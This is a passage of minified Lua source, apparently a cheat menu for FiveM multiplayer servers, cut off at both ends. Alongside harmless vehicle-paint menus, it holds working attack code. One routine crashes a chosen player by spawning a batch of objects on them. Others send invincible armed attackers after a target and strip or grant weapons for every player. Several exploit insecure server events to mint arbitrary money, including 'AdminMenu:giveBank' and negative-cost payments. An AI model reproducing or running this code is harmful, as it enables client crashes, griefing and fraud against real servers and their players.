    then local ped = CreatePed(21, eR, cM.x + math.sin(i * 2.0), cM.y - math.sin(i * 2.0), cM.z - 5.0, 0, true, true) and CreatePed(21, eR, cM.x - math.sin(i * 2.0), cM.y + math.sin(i * 2.0), cM.z - 5.0, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) SetNetworkIdExistsOnAllMachines(eT, true) Citizen.Wait(500) NetToPed(eT) GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) SetCurrentPedWeapon(ped, GetHashKey(eS), true) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
    else Citizen.Wait(0) end end end elseif e.Button("~h~~r~Rocket ~s~Player") then local cF = GetPlayerPed(SelectedPlayer) hecx, hecy, hecz = table.unpack(GetEntityCoords(cF)) RequestWeaponAsset(0xB1CA77B1, 31, 0) if IsPedInAnyVehicle(cF) then heccx, heccy, heccz = table.unpack(GetEntityCoords(GetVehiclePedIsUsing(cF))) ShootSingleBulletBetweenCoords(heccx, heccy, heccz + 10.0, heccx, heccy, heccz + 1.0, 1, 0, 0xB1CA77B1, cF, 1, 0, 0)
    else ShootSingleBulletBetweenCoords(hecx, hecy, hecz + 10.0, hecx, hecy, hecz + 1.0, 1, 0, 0xB1CA77B1, cF, 1, 0, 0) end elseif e.Button("~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_") then local cy = GetEntityCoords(GetPlayerPed(SelectedPlayer)) local cz = {
        0x9CF21E0F, 0x34315488, 0x6A27FEB1, 0xCB2ACC8, 0xC6899CDE, 0xD14B5BA3, 0xD9F4474C, 0x32A9996C, 0x69D4F974, 0xCAFC1EC3, 0x79B41171, 0x1075651, 0xC07792D4, 0x781E451D, 0x762657C6, 0xC2E75A21, 0xC3C00861, 0x81FB3FF0, 0x45EF7804, 0xE65EC0E4, 0xE764D794, 0xFBF7D21F, 0xE1AEB708, 0xA5E3D471, 0xD971BBAE, 0xCF7A9A9D, 0xC2CC99D8, 0x8FB233A4, 0x24E08E1F, 0x337B2B54, 0xB9402F87, 0x4F2526DA
    }
    for i = 1, #cz do local a = CreateObject(cz[i], cy, true, true, true) end end;
    e.Display() elseif e.IsMenuOpened(cc) then a5("~r~Troll ~s~player with peds", 0.33, 0.33) if e.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then local eU = "s_m_y_swat_01"
    local eS = "WEAPON_ASSAULTRIFLE"
    for i = 0, 10 do local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(eU)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(eU))
    then local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) SetNetworkIdExistsOnAllMachines(eT, true) Citizen.Wait(500) NetToPed(eT) GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
    else Citizen.Wait(0) end end end elseif e.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then local eU = "s_m_y_swat_01"
    local eS = "weapon_rpg"
    for i = 0, 10 do local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(eU)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(eU))
    then local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) SetNetworkIdExistsOnAllMachines(eT, true) Citizen.Wait(500) NetToPed(eT) GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
    else Citizen.Wait(0) end end end elseif e.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then local eU = "s_m_y_swat_01"
    local eS = "weapon_flaregun"
    for i = 0, 10 do local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(eU)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(eU))
    then local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) SetNetworkIdExistsOnAllMachines(eT, true) Citizen.Wait(500) NetToPed(eT) GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
    else Citizen.Wait(0) end end end elseif e.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then local eU = "s_m_y_swat_01"
    local eS = "weapon_railgun"
    for i = 0, 10 do local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(eU)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(eU))
    then local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) SetNetworkIdExistsOnAllMachines(eT, true) Citizen.Wait(500) NetToPed(eT) GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
    else Citizen.Wait(0) end end end end; e.Display() elseif IsDisabledControlPressed(0, 37) and IsDisabledControlPressed(0, 44) then cu() e.Display() elseif e.IsMenuOpened(bS) then a5("Teleport options for you", 0.38, 0.38) if e.Button("~h~Teleport to ~g~waypoint") then d2() elseif e.Button("~h~Teleport into ~g~nearest ~s~vehicle") then cW() elseif e.Button("~h~Teleport to ~r~coords") then cP() elseif e.Button("~h~Draw custom ~r~blip ~s~on map") then cT() elseif e.CheckBox("~h~Show ~g~Coords", showCoords, function(eC) showCoords = eC end) then end; e.Display() elseif e.IsMenuOpened(bT) then a5("Main weapon features list", 0.58, 0.58) if e.MenuButton("~h~~p~#~s~ Give Single Weapon", cq) then elseif e.Button("~h~~g~Give All Weapons") then
    for i = 1, #bn do GiveWeaponToPed(PlayerPedId(-1), GetHashKey(bn[i]), 1000, false, false) end elseif e.Button("~h~~r~Remove All Weapons") then RemoveAllPedWeapons(PlayerPedId(-1), true) elseif e.Button("~h~Drop your current Weapon") then local au = GetPlayerPed(-1) local b = GetSelectedPedWeapon(au) SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1) elseif e.Button("~h~~g~Give All Weapons to ~s~everyone") then
    for
    eV = 0, 128 do
        if eV ~=
    PlayerId(-1) and GetPlayerServerId(eV)  ~= 0 then
    for i = 1, #bn do GiveWeaponToPed(GetPlayerPed(eV), GetHashKey(bn[i]), 1000, false, false) end end end elseif e.Button("~h~~r~Remove All Weapons from ~s~everyone") then
    for
    eV = 0, 128 do
        if eV ~=
    PlayerId(-1) and GetPlayerServerId(eV)  ~= 0 then
    for i = 1, #bn do RemoveWeaponFromPed(GetPlayerPed(eV), GetHashKey(bn[i])) end end end elseif e.Button("~h~Give Ammo") then
    for
    i = 1, #bn do AddAmmoToPed(PlayerPedId(-1), GetHashKey(bn[i]), 200) end elseif e.CheckBox("~h~~r~OneShot Kill", oneshot, function(eC) oneshot = eC end) then elseif e.CheckBox("~h~~r~OneShot Car", oneshotcar, function(eC) oneshotcar = eC end) then elseif e.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Flare Gun", rainbowf, function(eC) rainbowf = eC end) then elseif e.CheckBox("~h~Vehicle Gun", VehicleGun, function(eC) VehicleGun = eC end) then elseif e.CheckBox("~h~Delete Gun", DeleteGun, function(eC) DeleteGun = eC end) then end;
    e.Display() elseif e.IsMenuOpened(cg) then veh = GetVehiclePedIsUsing(PlayerPedId()) for i, eq in pairs(bC) do
        if eq.
    id == "extra"
    and# checkValidVehicleExtras()  ~= 0 then
    if e.MenuButton(eq.name, eq.id) then end elseif eq.id == "neon"
    then
    if e.MenuButton(eq.name, eq.id) then end elseif eq.id == "paint"
    then
    if e.MenuButton(eq.name, eq.id) then end elseif eq.id == "wheeltypes"
    then
    if e.MenuButton(eq.name, eq.id) then end elseif eq.id == "headlight"
    then
    if e.MenuButton(eq.name, eq.id) then end elseif eq.id == "licence"
    then
    if e.MenuButton(eq.name, eq.id) then end
    else local aQ = checkValidVehicleMods(eq.id) for ci, ex in pairs(aQ) do
        if e.MenuButton(eq.name, eq.id) then end;
    break end end end;
    if IsToggleModOn(veh, 22) then xenonStatus = "Installed"
    else xenonStatus = "Not Installed"
    end;
    if e.Button("Xenon Headlight", xenonStatus) then
    if not IsToggleModOn(veh, 22) then ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
    else ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22)) end end; e.Display() elseif e.IsMenuOpened(cf) then veh = GetVehiclePedIsUsing(PlayerPedId()) for i, eq in pairs(bD) do
        if e.
    MenuButton(eq.name, eq.id) then end end;
    if IsToggleModOn(veh, 18) then turboStatus = "Installed"
    else turboStatus = "Not Installed"
    end;
    if e.Button("~h~~b~Turbo ~h~Tune", turboStatus) then
    if not IsToggleModOn(veh, 18) then ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
    else ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18)) end end; e.Display() elseif e.IsMenuOpened("primary") then e.MenuButton("~h~~p~#~s~ Classic", "classic1") e.MenuButton("~h~~p~#~s~ Metallic", "metallic1") e.MenuButton("~h~~p~#~s~ Matte", "matte1") e.MenuButton("~h~~p~#~s~ Metal", "metal1") e.Display() elseif e.IsMenuOpened("secondary") then e.MenuButton("~h~~p~#~s~ Classic", "classic2") e.MenuButton("~h~~p~#~s~ Metallic", "metallic2") e.MenuButton("~h~~p~#~s~ Matte", "matte2") e.MenuButton("~h~~p~#~s~ Metal", "metal2") e.Display() elseif e.IsMenuOpened("rimpaint") then e.MenuButton("~h~~p~#~s~ Classic", "classic3") e.MenuButton("~h~~p~#~s~ Metallic", "metallic3") e.MenuButton("~h~~p~#~s~ Matte", "matte3") e.MenuButton("~h~~p~#~s~ Metal", "metal3") e.Display() elseif e.IsMenuOpened("classic1") then
    for ew, eW in pairs(bI) do tp, ts = GetVehicleColours(veh) if tp ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and tp == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) by = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, eW.id, oldsec) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) bx = true elseif bx and curprim == eW.id then SetVehicleColours(veh, eW.id, oldsec) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) bx = false; bz = -1; by = -1 elseif bx and curprim ~= eW.id then SetVehicleColours(veh, eW.id, oldsec) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) bx = true end end end; e.Display() elseif e.IsMenuOpened("metallic1") then
    for ew, eW in pairs(bI) do tp, ts = GetVehicleColours(veh) if tp ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and tp == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) by = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, eW.id, oldsec) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) bx = true elseif bx and curprim == eW.id then SetVehicleColours(veh, eW.id, oldsec) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) bx = false; bz = -1; by = -1 elseif bx and curprim ~= eW.id then SetVehicleColours(veh, eW.id, oldsec) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) bx = true end end end; e.Display() elseif e.IsMenuOpened("matte1") then
    for ew, eW in pairs(bJ) do tp, ts = GetVehicleColours(veh) if tp ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and tp == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) by = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, eW.id, oldsec) bx = true elseif bx and curprim == eW.id then SetVehicleColours(veh, eW.id, oldsec) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) bx = false; bz = -1; by = -1 elseif bx and curprim ~= eW.id then SetVehicleColours(veh, eW.id, oldsec) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) bx = true end end end; e.Display() elseif e.IsMenuOpened("metal1") then
    for ew, eW in pairs(bK) do tp, ts = GetVehicleColours(veh) if tp ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and tp == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) by = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) SetVehicleColours(veh, eW.id, oldsec) bx = true elseif bx and curprim == eW.id then SetVehicleColours(veh, eW.id, oldsec) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) bx = false; bz = -1; by = -1 elseif bx and curprim ~= eW.id then SetVehicleColours(veh, eW.id, oldsec) SetVehicleExtraColours(veh, eW.id, oldwheelcolour) bx = true end end end; e.Display() elseif e.IsMenuOpened("classic2") then
    for ew, eW in pairs(bI) do tp, ts = GetVehicleColours(veh) if ts ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and ts == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) by = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, eW.id) bx = true elseif bx and cursec == eW.id then SetVehicleColours(veh, oldprim, eW.id) bx = false; bz = -1; by = -1 elseif bx and cursec ~= eW.id then SetVehicleColours(veh, oldprim, eW.id) bx = true end end end; e.Display() elseif e.IsMenuOpened("metallic2") then
    for ew, eW in pairs(bI) do tp, ts = GetVehicleColours(veh) if ts ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and ts == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) by = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, eW.id) bx = true elseif bx and cursec == eW.id then SetVehicleColours(veh, oldprim, eW.id) bx = false; bz = -1; by = -1 elseif bx and cursec ~= eW.id then SetVehicleColours(veh, oldprim, eW.id) bx = true end end end; e.Display() elseif e.IsMenuOpened("matte2") then
    for ew, eW in pairs(bJ) do tp, ts = GetVehicleColours(veh) if ts ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and ts == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) by = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, eW.id) bx = true elseif bx and cursec == eW.id then SetVehicleColours(veh, oldprim, eW.id) bx = false; bz = -1; by = -1 elseif bx and cursec ~= eW.id then SetVehicleColours(veh, oldprim, eW.id) bx = true end end end; e.Display() elseif e.IsMenuOpened("metal2") then
    for ew, eW in pairs(bK) do tp, ts = GetVehicleColours(veh) if ts ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and ts == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) by = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, eW.id) bx = true elseif bx and cursec == eW.id then SetVehicleColours(veh, oldprim, eW.id) bx = false; bz = -1; by = -1 elseif bx and cursec ~= eW.id then SetVehicleColours(veh, oldprim, eW.id) bx = true end end end; e.Display() elseif e.IsMenuOpened("classic3") then
    for ew, eW in pairs(bI) do _, ts = GetVehicleExtraColours(veh) if ts ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and ts == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; _, currims = GetVehicleExtraColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) by = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true elseif bx and currims == eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = false; bz = -1; by = -1 elseif bx and currims ~= eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true end end end; e.Display() elseif e.IsMenuOpened("metallic3") then
    for ew, eW in pairs(bI) do _, ts = GetVehicleExtraColours(veh) if ts ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and ts == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; _, currims = GetVehicleExtraColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) by = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true elseif bx and currims == eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = false; bz = -1; by = -1 elseif bx and currims ~= eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true end end end; e.Display() elseif e.IsMenuOpened("matte3") then
    for ew, eW in pairs(bJ) do _, ts = GetVehicleExtraColours(veh) if ts ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and ts == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; _, currims = GetVehicleExtraColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) by = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true elseif bx and currims == eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = false; bz = -1; by = -1 elseif bx and currims ~= eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true end end end; e.Display() elseif e.IsMenuOpened("metal3") then
    for ew, eW in pairs(bK) do _, ts = GetVehicleExtraColours(veh) if ts ==
    eW.id and not bx then pricetext = "Installed"
    else if bx and ts == eW.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; _, currims = GetVehicleExtraColours(veh) if e.Button(eW.name, pricetext) then
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) by = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true elseif bx and currims == eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = false; bz = -1; by = -1 elseif bx and currims ~= eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true end end end; e.Display() elseif e.IsMenuOpened(bV) then a5("Vehicle features for you", 0.58, 0.58) if e.MenuButton("~h~~p~#~s~ ~h~~b~LSC ~s~Customs", c4) then elseif e.MenuButton("~h~~p~#~s~ Vehicle ~g~Boost", cd) then elseif e.MenuButton("~h~~p~#~s~ Vehicle List", cm) then elseif e.MenuButton("~h~~p~#~s~ Global Car Trolls", c7) then elseif e.MenuButton("~h~~p~#~s~ Spawn & Attach ~s~Trailer", c2) then elseif e.Button("~h~Spawn ~r~Custom ~s~Vehicle") then d6() elseif e.Button("~h~~r~Delete ~s~Vehicle") then DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif e.Button("~h~~g~Repair ~s~Vehicle") then d8() elseif e.Button("~h~~g~Repair ~s~Engine") then d9() elseif e.Button("~h~~g~Flip ~s~Vehicle") then daojosdinpatpemata() elseif e.Button("~h~~b~Max ~s~Tuning") then MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif e.CheckBox("~h~Vehicle Godmode", VehGod, function(eC) VehGod = eC end) then elseif e.CheckBox("~h~~b~Waterproof ~s~Vehicle", waterp, function(eC) waterp = eC end) then elseif e.CheckBox("~h~Speedboost ~g~SHIFT ~r~CTRL", VehSpeed, function(eC) VehSpeed = eC end) then end; e.Display() elseif e.IsMenuOpened(c7) then
    if e.CheckBox("~h~~r~EMP~s~ Nearest Vehicles", destroyvehicles, function(eC) destroyvehicles = eC end) then elseif e.CheckBox("~h~~r~Delete~s~ Nearest Vehicles", deletenearestvehicle, function(eC) deletenearestvehicle = eC end) then elseif e.CheckBox("~h~~r~Alarm~s~ Nearest Vehicles", alarmvehicles, function(eC) alarmvehicles = eC end) then elseif e.Button("~h~~r~BORGAR~s~ Nearest Vehicles") then local cC = GetHashKey("xs_prop_hamburgher_wl") for vehicle in EnumerateVehicles() do local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end elseif e.CheckBox("~h~~r~Explode~s~ Nearest Vehicles", explodevehicles, function(eC) explodevehicles = eC end) then elseif e.CheckBox("~h~~p~Fuck~s~ Nearest Vehicles", fuckallcars, function(eC) fuckallcars = eC end) then end;
    e.Display() elseif e.IsMenuOpened(bQ) then a5("All handy LUA triggers", 0.46, 0.46) if e.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Money", bZ) then elseif e.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Misc", ca) then elseif e.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Drugs", cb) then elseif e.MenuButton("~h~~p~#~s~ ~y~VRP ~s~Triggers", bR) then elseif e.MenuButton("~h~~p~#~s~ ~b~Misc ~s~Triggers", c0) then end; e.Display() elseif e.IsMenuOpened(bZ) then a5("ESX Triggers for money only", 0.58, 0.58) if e.Button("~h~~o~Automatic Money ~r~ WARNING!") then automaticmoneyesx() elseif e.Button("~g~~h~ESX ~y~Caution Give Back") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_jobs:caution", "give_back", j) end elseif e.CheckBox("~g~~h~ESX Hunting~y~ reward", huntspam, function(eC) huntspam = eC end) then elseif e.Button("~g~~h~ESX ~y~Eden Garage") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("eden_garage:payhealth", {
        costs = -j
    }) end elseif e.Button("~g~~h~ESX ~y~Fuel Delivery") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_fueldelivery:pay", j) end elseif e.Button("~g~~h~ESX ~y~Car Thief") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_carthief:pay", j) end elseif e.Button("~g~~h~ESX ~y~DMV School") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_dmvschool:pay", {
        costs = -j
    }) end elseif e.Button("~g~~h~ESX ~y~Dirty Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_godirtyjob:pay", j) end elseif e.Button("~g~~h~ESX ~y~Pizza Boy") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_pizza:pay", j) end elseif e.Button("~g~~h~ESX ~y~Ranger Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_ranger:pay", j) end elseif e.Button("~g~~h~ESX ~y~Garbage Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_garbagejob:pay", j) end elseif e.Button("~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY") then local j = KeyboardInput("Enter amount of dirty money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_carthief:pay", j) end elseif e.Button("~g~~h~ESX ~y~Trucker Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_truckerjob:pay", j) end elseif e.Button("~g~~h~ESX ~y~Admin Give Bank") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("AdminMenu:giveBank", j) end elseif e.Button("~g~~h~ESX ~y~Admin Give Cash") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("AdminMenu:giveCash", j) end elseif e.Button("~g~~h~ESX ~y~Postal Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_gopostaljob:pay", j) end elseif e.Button("~g~~h~ESX ~y~Banker Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_banksecurity:pay", j) end elseif e.Button("~g~~h~ESX ~y~Slot Machine") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("esx_slotmachine:sv:2", j) end end; e.Display() elseif e.IsMenuOpened(ca) then a5("ESX Triggers for thirst/hunger/dmv etc", 0.42, 0.42) if e.Button("~w~~h~Set hunger to ~h~~g~100") then TriggerEvent("esx_status:set", "hunger", 1000000) elseif e.Button("~w~~h~Set thirst to ~h~~g~100") then TriggerEvent("esx_status:set", "thirst", 1000000) elseif e.Button("~g~~h~ESX ~r~Revive") then local M = KeyboardInput("Enter Player ID or all", "", 1000) if M then
    if M == "all"
    then
    for i = 0, 128 do TriggerEvent("esx_ambulancejob:revive", GetPlayerServerId(i)) TriggerEvent("esx_ambulancejob:revive", GetPlayerServerId(i)) end
    else TriggerEvent("esx_ambulancejob:revive", M) TriggerEvent("esx_ambulancejob:revive", M) end end elseif e.Button("~g~~h~ESX ~b~Handcuff") then local M = KeyboardInput("Enter Player ID or all", "", 1000) if M
    then
    if M == "all"
    then
    for i = 0, 128 do TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i)) TriggerEvent("esx_policejob:handcuff", GetPlayerServerId(i)) end
    else TriggerEvent("esx_policejob:handcuff", M) TriggerServerEvent("esx_policejob:handcuff", M) end end elseif e.Button("~h~Get Driving License") then TriggerServerEvent("esx_dmvschool:addLicense", 'dmv') TriggerServerEvent("esx_dmvschool:addLicense", 'drive') elseif e.Button("~h~~b~Buy ~s~a vehicle for ~g~free") then db() end;
